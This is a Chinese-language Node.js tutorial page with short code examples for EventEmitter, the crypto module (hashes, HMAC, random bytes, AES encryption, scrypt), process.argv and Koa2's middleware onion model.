<p>&#x6240;&#x6709;&#x6D41;&#x90FD;&#x662F; EventEmitter &#x7684;&#x5B9E;&#x4F8B;&#x3002;EventEmitter &#x4E3B;&#x8981;&#x4F5C;&#x7528;&#x662F;&#x5728; Node &#x4E2D;&#x63D0;&#x4F9B;&#x4E00;&#x79CD;&#x51FD;&#x6570;&#x8C03;&#x7528;&#x7684;&#x6A21;&#x5F0F;&#xFF0C;&#x5373;&#x89C2;&#x5BDF;&#x8005;&#x6A21;&#x5F0F;&#xFF0C;&#x7ED9;&#x4E8B;&#x4EF6;&#x6CE8;&#x518C;&#x4E00;&#x4E2A;&#x6216;&#x591A;&#x4E2A;&#x76D1;&#x542C;&#x5668;&#x3002;EventEmitter &#x6838;&#x5FC3; API =&gt; on &#x6CE8;&#x518C;&#x76D1;&#x542C;&#x5668;&#x3001;once &#x6CE8;&#x518C;&#x4E00;&#x6B21;&#x6027;&#x76D1;&#x542C;&#x5668;&#x3001;emit &#x89E6;&#x53D1;&#x4E8B;&#x4EF6;&#xFF0C;&#x540C;&#x6B65;&#x8C03;&#x7528;&#x76D1;&#x542C;&#x5668;&#x3001;removeListener &#x79FB;&#x9664;&#x67D0;&#x4E8B;&#x4EF6;&#x76D1;&#x542C;&#x5668;&#x3002;</p>
<pre><code class="language-js">const {EventEmitter} = require(&quot;events&quot;);
const ee = new EventEmitter();
ee.on(&quot;eventTest&quot;,()=&gt;{console.log(&quot;ok&quot;);});
ee.on(&quot;eventTest&quot;,()=&gt;{console.log(&quot;okk&quot;);});
ee.prependListener(&quot;eventTest&quot;,function yes(){console.log(&quot;yes&quot;);}) // prependListener =&gt; &#x76D1;&#x542C;&#x5668;&#x63D2;&#x5165;&#x6570;&#x7EC4;&#x5F00;&#x5934;
ee.emit(&quot;eventTest&quot;); // &#x540C;&#x6B65;&#x8C03;&#x7528; =&gt; &#x76D1;&#x542C;&#x5668;&#x6CE8;&#x518C;&#x987A;&#x5E8F;&#x5C31;&#x662F;&#x6267;&#x884C;&#x987A;&#x5E8F; =&gt; &#x8981;&#x6C42;&#x5728;&#x89E6;&#x53D1;&#x524D;&#x6CE8;&#x518C;&#x597D;&#x76D1;&#x542C;&#x5668;
console.log(ee.listeners(&quot;eventTest&quot;));
</code></pre>
<pre><code class="language-js">const {EventEmitter} = require(&quot;events&quot;);
const ee = new EventEmitter();
process.nextTick(()=&gt;{ // nextTick &#x6267;&#x884C;&#x4F1A;&#x5EF6;&#x8FDF;&#x5230;&#x540C;&#x6B65;&#x4EE3;&#x7801;&#x4E4B;&#x540E;
  ee.emit(&quot;eventTest&quot;)
})
ee.on(&quot;eventTest&quot;,()=&gt;{console.log(&quot;ok&quot;);});
</code></pre>
<pre><code class="language-js">const { EventEmitter } = require(&quot;events&quot;);
const fs = require(&quot;fs&quot;);
function mySearch(param) {
  const ee = new EventEmitter();
  const r = fs.createReadStream(&quot;./r.txt&quot;, { encoding: &quot;utf-8&quot; });
  r.on(&quot;data&quot;, (chunk) =&gt; {
    if (chunk.match(new RegExp(param))) {
      ee.emit(&quot;found&quot;);
    } else {
      ee.emit(&quot;unfound&quot;);
    }
  }).on(&quot;error&quot;, () =&gt; {
    ee.emit(&quot;error&quot;, error);
  });
  return ee;
}
module.exports = mySearch;
</code></pre>
<pre><code class="language-js">const ms = require(&quot;./utils&quot;);
ms(&quot;okk&quot;).on(&quot;found&quot;,()=&gt;{console.log(&quot;found&quot;);}).on(&quot;unfound&quot;,()=&gt;{console.log(&quot;unfound&quot;);}).on(&quot;error&quot;,(err)=&gt;{console.log(err);})
</code></pre>
<h3 id="crypto">Crypto</h3>
<blockquote>
<p>The crypto module provides cryptographic functionality that includes a set of wrappers for OpenSSL&apos;s hash, HMAC, cipher, decipher, sign, and verify funcs.</p>
</blockquote>
<p>message digest algorithm &#x6D88;&#x606F;&#x6458;&#x8981;&#x7B97;&#x6CD5;&#x6216; hash function &#x6563;&#x5217;&#x51FD;&#x6570;&#x662F;&#x5C06;&#x4EFB;&#x610F;&#x957F;&#x5EA6;&#x7684;&#x8F93;&#x5165;&#x6570;&#x636E;&#x6620;&#x5C04;&#x5230;&#x56FA;&#x5B9A;&#x957F;&#x5EA6;&#x7684;&#x8F93;&#x51FA;&#x7684;&#x8FC7;&#x7A0B;&#x3002;&#x8F93;&#x51FA;&#x901A;&#x5E38;&#x88AB;&#x79F0;&#x4E3A;&#x6563;&#x5217;&#x503C;&#x3001;&#x6563;&#x5217;&#x7801;&#x6216;&#x6D88;&#x606F;&#x6458;&#x8981;&#x3002;</p>
<ul>
<li>crypto.createHash(algorithm[, options]) =&gt; &#x521B;&#x5EFA;&#x5E76;&#x8FD4;&#x56DE; Hash &#x5BF9;&#x8C61;</li>
</ul>
<p>&#x8BE5; Hash &#x5BF9;&#x8C61;&#x53EF;&#x7528;&#x4E8E;&#x4EE5;&#x7ED9;&#x5B9A;&#x7B97;&#x6CD5;&#x751F;&#x6210;&#x54C8;&#x5E0C;&#x6458;&#x8981;&#x3002;&#x53EF;&#x9009;&#x9009;&#x9879;&#x53C2;&#x6570;&#x63A7;&#x5236;&#x6D41;&#x884C;&#x4E3A;&#x3002;</p>
<p>algorithm &#x53D6;&#x51B3;&#x4E8E;&#x5E73;&#x53F0;&#x4E0A; OpenSSL &#x7248;&#x672C;&#x6240;&#x652F;&#x6301;&#x7684;&#x7B97;&#x6CD5;&#x3002;</p>
<pre><code class="language-shell">$ openssl list-message-digest-algorithms
$ openssl list -digest-algorithms
$ openssl version
</code></pre>
<ul>
<li>hash.update(data[, inputEncoding]) =&gt; &#x7528;&#x7ED9;&#x5B9A;&#x7684;&#x6570;&#x636E;&#x66F4;&#x65B0;&#x54C8;&#x5E0C;</li>
</ul>
<p>&#x5F53; data &#x4F20;&#x5165;&#x7684;&#x662F;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x4E14;&#x672A;&#x8BBE;&#x7F6E;&#x8F93;&#x5165;&#x7F16;&#x7801; inputEncoding &#x65F6;&#xFF0C;&#x9ED8;&#x8BA4;&#x4F7F;&#x7528; utf-8&#x3002;</p>
<p>&#x5F53; data &#x4F20;&#x5165;&#x7684;&#x662F; Buffer&#x3001;TypedArray &#x6216; DataView &#x65F6;&#xFF0C;inputEncoding &#x53EF;&#x5FFD;&#x7565;&#x3002;</p>
<p>update &#x65B9;&#x6CD5;&#x53EF;&#x4EE5;&#x591A;&#x6B21;&#x8C03;&#x7528;&#xFF0C;&#x4EE5;&#x66F4;&#x65B0;&#x6444;&#x53D6;&#x6D41;&#x6570;&#x636E;&#xFF0C;&#x4F8B;&#x5982;&#x6765;&#x81EA;&#x6587;&#x4EF6;&#x8BFB;&#x53D6;&#x6D41;&#x7684;&#x7F13;&#x51B2;&#x533A;&#x3002;</p>
<ul>
<li>hash.digest([encoding]) =&gt; &#x8BA1;&#x7B97;&#x6570;&#x636E;&#x7684;&#x6458;&#x8981;</li>
</ul>
<p>encoding &#x53EF;&#x4EE5;&#x662F; hex&#x3001;latin1 &#x6216; base64&#x3002;v6.4.0	&#x4E2D;&#x5C06; latin1 &#x4F5C;&#x4E3A; binary &#x7684;&#x522B;&#x540D;&#x3002;</p>
<p>&#x63D0;&#x4F9B; encoding &#x4F1A;&#x8FD4;&#x56DE;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x5426;&#x5219;&#x8FD4;&#x56DE; Buffer &#x5B9E;&#x4F8B;&#x3002;</p>
<p>&#x8C03;&#x7528;&#x5B8C; digest &#x65B9;&#x6CD5;&#x540E;&#x7684; Hash &#x5BF9;&#x8C61;&#x4E0D;&#x53EF;&#x518D;&#x4F7F;&#x7528;&#xFF0C;&#x5426;&#x5219;&#x4F1A;&#x629B;&#x51FA;&#x5F02;&#x5E38;&#x3002;</p>
<pre><code class="language-js">const crypto = require(&apos;crypto&apos;);
const md5 = crypto.createHash(&apos;md5&apos;);
const message = &apos;hello crypto&apos;;
const digest = md5.update(message, &apos;utf8&apos;).digest(&apos;hex&apos;); 
console.log(digest, digest.length); // 2384190895f6fa3de5b7c458532c8d75 32
</code></pre>
<blockquote>
<p><a href="https://zh.m.wikipedia.org/zh-cn/HMAC">HMAC</a> &#x6709;&#x65F6;&#x6269;&#x5C55;&#x4E3A; keyed-hash message authentication code &#x5BC6;&#x94A5;&#x6563;&#x5217;&#x6D88;&#x606F;&#x8BA4;&#x8BC1;&#x7801;&#xFF0C;&#x6216; hash-based message authentication code &#x6563;&#x5217;&#x6D88;&#x606F;&#x8BA4;&#x8BC1;&#x7801;&#xFF0C;&#x662F;&#x4E00;&#x79CD;&#x901A;&#x8FC7;&#x7279;&#x522B;&#x8BA1;&#x7B97;&#x65B9;&#x5F0F;&#x4E4B;&#x540E;&#x4EA7;&#x751F;&#x7684;&#x6D88;&#x606F;&#x8BA4;&#x8BC1;&#x7801; MAC&#x3002;&#x4F7F;&#x7528;&#x5BC6;&#x7801;&#x6563;&#x5217;&#x51FD;&#x6570;&#xFF0C;&#x540C;&#x65F6;&#x7ED3;&#x5408;&#x4E00;&#x4E2A;&#x52A0;&#x5BC6;&#x5BC6;&#x94A5;&#x3002;&#x53EF;&#x4EE5;&#x7528;&#x6765;&#x4FDD;&#x8BC1;&#x8D44;&#x6599;&#x7684;&#x5B8C;&#x6574;&#x6027;&#xFF0C;&#x540C;&#x65F6;&#x53EF;&#x4EE5;&#x7528;&#x6765;&#x4F5C;&#x67D0;&#x4E2A;&#x6D88;&#x606F;&#x7684;&#x8EAB;&#x4EFD;&#x9A8C;&#x8BC1;&#x3002;</p>
</blockquote>
<ul>
<li>crypto.createHmac(algorithm, key[, options]) =&gt; &#x8FD4;&#x56DE;&#x7279;&#x5B9A;&#x7684; Hmac &#x5BF9;&#x8C61;</li>
</ul>
<p>&#x521B;&#x5EFA;&#x5E76;&#x8FD4;&#x56DE;&#x4F7F;&#x7528;&#x7ED9;&#x5B9A;&#x7B97;&#x6CD5;&#x548C;&#x5BC6;&#x94A5;&#x7684; Hmac &#x5BF9;&#x8C61;&#x3002;&#x53EF;&#x9009;&#x9009;&#x9879;&#x53C2;&#x6570;&#x63A7;&#x5236;&#x6D41;&#x884C;&#x4E3A;&#x3002;</p>
<pre><code class="language-js">const crypto = require(&quot;crypto&quot;);
const hmac = crypto.createHmac(&quot;sha256&quot;, &quot;secret key&quot;);
const res = hmac.update(&quot;hello hmac&quot;).digest(&quot;hex&quot;);
console.log(res);
</code></pre>
<p>key &#x7528;&#x4E8E;&#x751F;&#x6210;&#x52A0;&#x5BC6;&#x7684; HMAC &#x54C8;&#x5E0C;&#x3002;&#x82E5; key &#x662F; <a href="https://nodejs.org/dist/latest-v16.x/docs/api/crypto.html#class-keyobject">KeyObject</a>&#xFF0C;&#x5176; type &#x5FC5;&#x987B;&#x4E3A; secret&#x3002;</p>
<pre><code class="language-js">// hmac.js
const { createReadStream } = require(&quot;fs&quot;);
const { createHmac } = require(&quot;crypto&quot;);
const { argv } = require(&quot;process&quot;);
const filename = argv[2];
const hmac = createHmac(&quot;sha256&quot;, &quot;hello hmac&quot;);
console.log(hmac);
const input = createReadStream(filename);
input.on(&quot;readable&quot;, () =&gt; {
  const data = input.read();
  if (data) hmac.update(data);
  else {
    console.log(`${hmac.digest(&quot;hex&quot;)} ${filename}`);
  }
});
</code></pre>
<pre><code class="language-js">$ node &quot;/Users/.../hmac.js&quot; hmac.js
Hmac {
  _options: undefined,
  [Symbol(kHandle)]: Hmac {},
  [Symbol(kState)]: { [Symbol(kFinalized)]: false }
}
961f862e87d5ef0bf2b4d0d826157473484b20caa7dca746e2764624dee9b00d hmac.js
</code></pre>
<ul>
<li>crypto.randomBytes(size[, callback]) =&gt; &#x751F;&#x6210;&#x52A0;&#x5BC6;&#x7684;&#x5F3A;&#x4F2A;&#x968F;&#x673A;&#x6570;&#x636E;</li>
</ul>
<p>size &#x4E3A;&#x751F;&#x6210;&#x7684;&#x5B57;&#x8282;&#x6570;&#xFF0C;&#x4E0D;&#x5F97;&#x5927;&#x4E8E; 2 ** 31 - 1&#x3002;</p>
<p>&#x56DE;&#x8C03;&#x51FD;&#x6570;&#x672A;&#x63D0;&#x4F9B;&#x65F6;&#xFF0C;&#x540C;&#x6B65;&#x751F;&#x6210;&#x968F;&#x673A;&#x5B57;&#x8282;&#x5E76;&#x4EE5;&#x7F13;&#x51B2;&#x533A;&#x8FD4;&#x56DE;&#xFF1B;&#x56DE;&#x8C03;&#x51FD;&#x6570;&#x63D0;&#x4F9B;&#x65F6;&#xFF0C;&#x4F1A;&#x88AB;&#x5F02;&#x6B65;&#x8C03;&#x7528;&#x751F;&#x6210;&#x5B57;&#x8282;&#x3002;&#x8BE5;&#x56DE;&#x8C03;&#x51FD;&#x6570;&#x5305;&#x542B; err &#x548C; buf &#x4E24;&#x4E2A;&#x53C2;&#x6570;&#x3002;</p>
<p>err &#x4E3A;&#x9519;&#x8BEF;&#x53D1;&#x751F;&#x65F6;&#x7684; Error &#x5BF9;&#x8C61;&#xFF0C;buf &#x4E3A;&#x751F;&#x6210;&#x5B57;&#x8282;&#x7684;&#x7F13;&#x51B2;&#x533A;&#x3002;</p>
<pre><code class="language-js">const { randomBytes } = require(&apos;crypto&apos;);
randomBytes(256, (err, buf) =&gt; {
  if (err) throw err;
  console.log(`${buf.length} bytes of random data: ${buf.toString(&apos;hex&apos;)} =&gt; Async`);
});
const buf = randomBytes(256);
console.log(`${buf.length} bytes of random data: ${buf.toString(&apos;hex&apos;)} =&gt; Sync`);
</code></pre>
<ul>
<li>Public-key cryptography &amp; Symmetric-key algorithm</li>
</ul>
<p>&#x5728;&#x660E;&#x6587;&#x548C;&#x5BC6;&#x6587;&#x4E4B;&#x95F4;&#x901A;&#x8FC7;&#x6307;&#x5B9A;&#x7B97;&#x6CD5;&#x4E92;&#x76F8;&#x8F6C;&#x6362;&#x65F6;&#xFF0C;&#x53EF;&#x901A;&#x8FC7;&#x5F15;&#x5165;&#x5BC6;&#x94A5;&#x6765;&#x589E;&#x5F3A;&#x5B89;&#x5168;&#x6027;&#x3002;&#x6839;&#x636E;&#x52A0;&#x5BC6;&#x548C;&#x89E3;&#x5BC6;&#x65F6;&#x6240;&#x7528;&#x7684;&#x79D8;&#x94A5;&#x662F;&#x5426;&#x76F8;&#x540C;&#xFF0C;&#x53EF;&#x4EE5;&#x5C06;&#x52A0;&#x5BC6;&#x7B97;&#x6CD5;&#x5206;&#x4E3A;&#x5BF9;&#x79F0;&#x52A0;&#x5BC6;&#x4E0E;&#x975E;&#x5BF9;&#x79F0;&#x52A0;&#x5BC6;&#x3002;</p>
<p>&#x516C;&#x5F00;&#x5BC6;&#x94A5;&#x52A0;&#x5BC6;&#x4E5F;&#x79F0;&#x4E3A;&#x975E;&#x5BF9;&#x79F0;&#x5F0F;&#x52A0;&#x5BC6;&#xFF0C;&#x5176;&#x516C;&#x94A5;&#x7528;&#x4F5C;&#x52A0;&#x5BC6;&#xFF0C;&#x79C1;&#x94A5;&#x5219;&#x7528;&#x4F5C;&#x89E3;&#x5BC6;&#x3002;&#x516C;&#x94A5;&#x53EF;&#x4EFB;&#x610F;&#x5411;&#x5916;&#x516C;&#x5F00;&#x6216;&#x53D1;&#x5E03;&#xFF1B;&#x79C1;&#x94A5;&#x4E0D;&#x53EF;&#x4EE5;&#x516C;&#x5F00;&#xFF0C;&#x5FC5;&#x987B;&#x4E25;&#x683C;&#x4FDD;&#x7BA1;&#x3002;RSA&#x3001;ElGamal&#x3001;DSA...</p>
<p>&#x5BF9;&#x79F0;&#x5BC6;&#x94A5;&#x52A0;&#x5BC6;&#x8981;&#x6C42;&#x5728;&#x52A0;&#x5BC6;&#x548C;&#x89E3;&#x5BC6;&#x65F6;&#x4F7F;&#x7528;&#x76F8;&#x540C;&#x7684;&#x5BC6;&#x94A5;&#x3002;&#x5BF9;&#x79F0;&#x52A0;&#x5BC6;&#x7684;&#x901F;&#x5EA6;&#x6BD4;&#x516C;&#x94A5;&#x52A0;&#x5BC6;&#x5FEB;&#x5F88;&#x591A;&#x3002;AES&#x3001;DES&#x3001;Blowfish&#x3001;IDEA...</p>
<ul>
<li>crypto.createCipheriv(algorithm, key, iv[, options]) =&gt; &#x8FD4;&#x56DE; Cipher &#x5BF9;&#x8C61;</li>
</ul>
<p>&#x4F7F;&#x7528;&#x7ED9;&#x5B9A;&#x7684;&#x7B97;&#x6CD5;&#x3001;&#x5BC6;&#x94A5;&#x548C;&#x521D;&#x59CB;&#x5316;&#x5411;&#x91CF;&#x521B;&#x5EFA;&#x5E76;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A; Cipher &#x5BF9;&#x8C61;&#x3002;</p>
<blockquote>
<p>The key is the raw key used by the algorithm and iv is an initialization vector. Both arguments must be &apos;utf8&apos; encoded strings, Buffers, TypedArray, or DataViews. The key may optionally be a KeyObject of type secret. If the cipher does not need an initialization vector, iv may be null.</p>
</blockquote>
<p>&#x521D;&#x59CB;&#x5316;&#x5411;&#x91CF;&#x5E94;&#x8BE5;&#x662F;&#x4E0D;&#x53EF;&#x9884;&#x6D4B;&#x4E14;&#x552F;&#x4E00;&#x7684;&#xFF0C;&#x5728;&#x7406;&#x60F3;&#x60C5;&#x51B5;&#x4E0B;&#x751A;&#x81F3;&#x662F;&#x52A0;&#x5BC6;&#x968F;&#x673A;&#x7684;&#x3002;&#x521D;&#x59CB;&#x5316;&#x5411;&#x91CF;&#x4E0D;&#x5FC5;&#x4E25;&#x683C;&#x4FDD;&#x7BA1;&#xFF0C;&#x901A;&#x5E38;&#x4F1A;&#x6DFB;&#x52A0;&#x5230;&#x672A;&#x52A0;&#x5BC6;&#x7684;&#x660E;&#x6587;&#x3002;</p>
<p><a href="https://en.wikipedia.org/wiki/Advanced_Encryption_Standard">AES</a> &#x7684;&#x533A;&#x5757;&#x957F;&#x5EA6;&#x56FA;&#x5B9A;&#x4E3A; 128 &#x6BD4;&#x7279;&#xFF0C;&#x5BC6;&#x94A5;&#x957F;&#x5EA6;&#x5219;&#x53EF;&#x4EE5;&#x662F; 128&#xFF0C;192 &#x6216; 256 &#x6BD4;&#x7279;&#x3002;</p>
<ul>
<li>crypto.createDecipheriv(algorithm, key, iv[, options])</li>
</ul>
<p>&#x901A;&#x8FC7;&#x6307;&#x5B9A;&#x6761;&#x4EF6;&#x521B;&#x5EFA;&#x5E76;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A; Decipher &#x5BF9;&#x8C61;&#x3002;&#x53EF;&#x9009;&#x53C2;&#x6570; options &#x63A7;&#x5236;&#x6D41;&#x7684;&#x884C;&#x4E3A;&#x3002;</p>
<ul>
<li>cipher.update(data[, inputEncoding][, outputEncoding])</li>
</ul>
<p>&#x901A;&#x8FC7; data &#x66F4;&#x65B0; Cipher &#x5BF9;&#x8C61;&#x3002;inputEncoding &#x6307;&#x5B9A;&#x65F6;&#xFF0C;data &#x662F;&#x5B57;&#x7B26;&#x4E32;&#x7C7B;&#x578B;&#x3002;&#x672A;&#x63D0;&#x4F9B; inputEncoding &#x65F6;&#xFF0C;data &#x5FC5;&#x987B;&#x65F6; Buffer&#x3001;TypedArray &#x6216;&#x8005; DataView&#x3002;&#x82E5; data &#x662F; Buffer&#x3001;TypedArray &#x6216;&#x8005; DataView&#xFF0C;&#x8F93;&#x5165;&#x7F16;&#x7801;&#x683C;&#x5F0F;&#x53EF;&#x5FFD;&#x7565;&#x3002;</p>
<p>&#x8F93;&#x51FA;&#x7F16;&#x7801;&#x683C;&#x5F0F;&#x6307;&#x5B9A;&#x65F6;&#x8FD4;&#x56DE;&#x5B57;&#x7B26;&#x4E32;&#xFF1B;&#x672A;&#x63D0;&#x4F9B;&#x8F93;&#x51FA;&#x7F16;&#x7801;&#x683C;&#x5F0F;&#x5219;&#x4F1A;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x7F13;&#x51B2;&#x533A;&#x3002;</p>
<p>update &#x65B9;&#x6CD5;&#x53EF;&#x5728; final &#x65B9;&#x6CD5;&#x524D;&#x8C03;&#x7528;&#x591A;&#x6B21;&#x5E76;&#x4F20;&#x5165;&#x65B0;&#x7684; data&#x3002;final &#x65B9;&#x6CD5;&#x8C03;&#x7528;&#x540E;&#x518D;&#x6267;&#x884C; update &#x4F1A;&#x629B;&#x51FA;&#x5F02;&#x5E38;&#x3002;</p>
<pre><code class="language-js">const crypto = require(&quot;crypto&quot;);
const key = crypto.randomBytes(192 / 8);
const iv = crypto.randomBytes(128 / 8);
const algorithm = &quot;aes192&quot;;
function encrypt(text) {
  const cipher = crypto.createCipheriv(algorithm, key, iv);
  cipher.update(text);
  return cipher.final(&quot;hex&quot;);
}

function decrypt(encrypted) {
  const decipher = crypto.createDecipheriv(algorithm, key, iv);
  decipher.update(encrypted, &quot;hex&quot;);
  return decipher.final(&quot;utf8&quot;);
}

const content = &quot;hello&quot;;
const crypted = encrypt(content);
const decrypted = decrypt(crypted);
console.log(crypted, decrypted);
</code></pre>
<ul>
<li>cipher.final([outputEncoding])</li>
</ul>
<p>&#x8FD4;&#x56DE; Cipher &#x5BF9;&#x8C61;&#x7684;&#x503C;&#x3002;&#x6307;&#x5B9A; outputEncoding &#x65F6;&#x8FD4;&#x56DE;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x5426;&#x5219;&#x8FD4;&#x56DE;&#x7F13;&#x51B2;&#x533A;&#x3002;</p>
<p>final &#x65B9;&#x6CD5;&#x88AB;&#x8C03;&#x7528;&#x540E;&#xFF0C;Cipher &#x5BF9;&#x8C61;&#x4E0D;&#x518D;&#x7528;&#x4F5C;&#x52A0;&#x5BC6;&#x6570;&#x636E;&#xFF0C;&#x91CD;&#x590D;&#x8C03;&#x7528;&#x591A;&#x6B21; final &#x65B9;&#x6CD5;&#x4F1A;&#x629B;&#x51FA;&#x5F02;&#x5E38;&#x3002;</p>
<ul>
<li>crypto.scryptSync(password, salt, keylen[, options])</li>
</ul>
<p>&#x8FD4;&#x56DE;&#x7F13;&#x51B2;&#x533A;&#x3002;&#x63D0;&#x4F9B;&#x540C;&#x6B65;&#x7684; scrypt &#x5B9E;&#x73B0;&#x3002;scrypt &#x662F;&#x4E00;&#x4E2A;&#x57FA;&#x4E8E;&#x5BC6;&#x7801;&#x7684;&#x5BC6;&#x94A5;&#x6D3E;&#x751F;&#x51FD;&#x6570;&#x3002;</p>
<blockquote>
<p>In cryptography, a salt is random data that is used as an additional input to a one-way function that hashes data, a password or passphrase. Salts are used to safeguard passwords in storage. <a href="https://en.wikipedia.org/wiki/Salt_(cryptography)">wiki</a></p>
</blockquote>
<p>&#x5C3D;&#x53EF;&#x80FD;&#x7684;&#x9009;&#x62E9;&#x5177;&#x6709;&#x552F;&#x4E00;&#x6027;&#x7684; salt&#xFF0C;&#x63A8;&#x8350; salt &#x662F;&#x81F3;&#x5C11; 16 bytes &#x7684;&#x968F;&#x673A;&#x6570;&#x3002;</p>
<p>keylen &#x8868;&#x793A;&#x5BC6;&#x94A5;&#x7684;&#x957F;&#x5EA6;&#xFF0C;&#x5FC5;&#x987B;&#x662F;&#x6570;&#x5B57;&#x3002;</p>
<pre><code class="language-js">const { scryptSync } = require(&quot;crypto&quot;);
const key1 = scryptSync(&quot;hello password&quot;, &quot;hello salt&quot;, 64);
const key2 = scryptSync(&quot;hello password&quot;, &quot;hello salt&quot;, 64, { N: 256 });
console.log(key1.toString(&quot;hex&quot;), key2.toString(&quot;hex&quot;));
</code></pre>
<h3 id="process">Process</h3>
<ul>
<li>process.argv =&gt; &#x8FD4;&#x56DE;&#x547D;&#x4EE4;&#x884C;&#x542F;&#x52A8; Node &#x8FDB;&#x7A0B;&#x65F6;&#x6240;&#x4F20;&#x9012;&#x7684;&#x53C2;&#x6570;&#x6570;&#x7EC4;</li>
</ul>
<p>&#x6570;&#x7EC4;&#x5143;&#x7D20;&#x4F9D;&#x6B21;&#x4E3A; process.execPath&#xFF0C;&#x6B63;&#x5728;&#x6267;&#x884C;&#x7684;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;&#x548C;&#x9644;&#x52A0;&#x7684;&#x547D;&#x4EE4;&#x884C;&#x53C2;&#x6570;&#x3002;</p>
<pre><code class="language-js">const { argv } = require(&apos;process&apos;);
argv.forEach((val, index) =&gt; {
  console.log(`${index}: ${val}`);
});
</code></pre>
<p>process.argv0 &#x5C5E;&#x6027;&#x5B58;&#x50A8; Node &#x542F;&#x52A8;&#x65F6;&#x4F20;&#x9012; argv[0] &#x7684;&#x539F;&#x59CB;&#x503C;&#x7684;&#x53EA;&#x8BFB;&#x526F;&#x672C;&#x3002;</p>
<pre><code class="language-js">process.execPath.split(&quot;/&quot;).pop() == process.argv0
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="framework">Framework</h2>
<h3 id="koa2">Koa2</h3>
<p>Express &#x5185;&#x7F6E;&#x6346;&#x7ED1;&#x8BB8;&#x591A;&#x51FD;&#x6570;&#xFF0C;&#x800C; <a href="http://koajs.cn/">Koa</a> &#x8F7B;&#x91CF;&#x5230;&#x53EA;&#x5269;&#x57FA;&#x672C;&#x529F;&#x80FD;&#xFF0C;&#x5F53;&#x9700;&#x8981;&#x7684;&#x65F6;&#x5019;&#x518D;&#x901A;&#x8FC7;&#x9002;&#x5408;&#x7684;&#x4E2D;&#x95F4;&#x4EF6; <a href="https://github.com/koajs/koa/wiki">Middleware</a> &#x6765;&#x642D;&#x914D;&#x7EC4;&#x5408;&#x3002;&#x53EF;&#x901A;&#x8FC7; <a href="https://github.com/i5ting/koa-generator#readme">koa-generator</a> &#x811A;&#x624B;&#x67B6;&#x5FEB;&#x901F;&#x642D;&#x5EFA;&#x3002;</p>
<ul>
<li>Hello World</li>
</ul>
<pre><code class="language-shell">$ npm install --save koa
</code></pre>
<p>&#x5F15;&#x5165; Koa &#x6A21;&#x5757;&#x5E76;&#x521B;&#x5EFA; Koa &#x5B9E;&#x4F8B; app&#x3002;Web &#x8BF7;&#x6C42;&#x4F1A;&#x7ECF;&#x8FC7; <code>app.use()</code> &#x51FD;&#x6570;&#x7684;&#x5904;&#x7406;&#x3002;</p>
<pre><code class="language-javascript">const Koa = require(&apos;koa&apos;);
const app = new Koa();
app.use(async ctx =&gt; { ctx.body = &apos;Hello World&apos;; });
app.listen(3000);
</code></pre>
<ul>
<li>Koa &#x6D0B;&#x8471;&#x6A21;&#x578B; onion model</li>
</ul>
<blockquote>
<p>await next() divides each middleware into pre-operation, other middleware operations and post-operation.</p>
</blockquote>
<p>&#x4EE3;&#x7801;&#x8FD0;&#x884C;&#x5230; <code>next()</code> &#x4F1A;&#x6682;&#x505C;&#x5F53;&#x524D;&#xFF0C;&#x6267;&#x884C;&#x540E;&#x7EED;&#x4E2D;&#x95F4;&#x4EF6;&#x3002;<code>next()</code> &#x8FD4;&#x56DE; Promise &#x7684;&#x5B9E;&#x4F8B;&#xFF0C;&#x4F7F;&#x7528; await &#x662F;&#x6B32;&#x4EE5;&#x540C;&#x6B65;&#x7684;&#x65B9;&#x5F0F;&#x7B49;&#x5F85; Promise &#x5B9E;&#x4F8B;&#x7684;&#x6267;&#x884C;&#x5B8C;&#x6210;&#x3002;&#x5D4C;&#x5957;&#x7684; Promise &#x5C31;&#x50CF;&#x6D0B;&#x8471;&#x7684;&#x6A21;&#x578B;&#xFF0C;&#x76F4;&#x5230; await &#x8FD4;&#x56DE;&#x6700;&#x5185;&#x5C42; Promise &#x7684; resolve &#x503C;&#x3002;</p>
<pre><code class="language-javascript">Promise.resolve(middleware1(context, async() =&gt; {
  return Promise.resolve(middleware2(context, async() =&gt; {
    return Promise.resolve(middleware3(context, async() =&gt; {
      return Promise.resolve();
    }));
  }));
}))
.then(() =&gt; { console.log(&apos;end&apos;); });
</code></pre>
<pre><code class="language-javascript">const Koa = require(&apos;koa&apos;);
let app = new Koa();

const middleware1 = async (ctx, next) =&gt; { console.log(1); await next(); console.log(6); }
const middleware2 = async (ctx, next) =&gt; { console.log(2); await next(); console.log(5); }
const middleware3 = async (ctx, next) =&gt; { console.log(3); await next(); console.log(4); }

app.use(middleware1).use(middleware2).use(middleware3);
app.use(async(ctx, next) =&gt; { ctx.body = &apos;hello world&apos; })
app.listen(3000)
// Output 1, 2, 3, 4, 5, 6
</code></pre>
<pre><code class="language-javascript">const Koa = require(&apos;koa&apos;);
let app = new Koa();

const p = function(args) {
  return new Promise(resolve =&gt; { setTimeout(() =&gt; { console.log(args); resolve(); }, 100); });
};

const middleware1 = async (ctx, next) =&gt; {
  await p(1);
  // await next();
  next();
  console.log(6);
};

const middleware2 = async (ctx, next) =&gt; {
  await p(2);
  // await next();
  next();
  console.log(5);
};

const middleware3 = async (ctx, next) =&gt; {
  await p(3);
  // await next();
  next();
  console.log(4);
};

app.use(middleware1).use(middleware2).use(middleware3);
app.use(async(ctx, next) =&gt; { ctx.body = &apos;hello world&apos; })
app.listen(3000)
// Output: 1, 6, 2, 5, 3, 4
</code></pre>
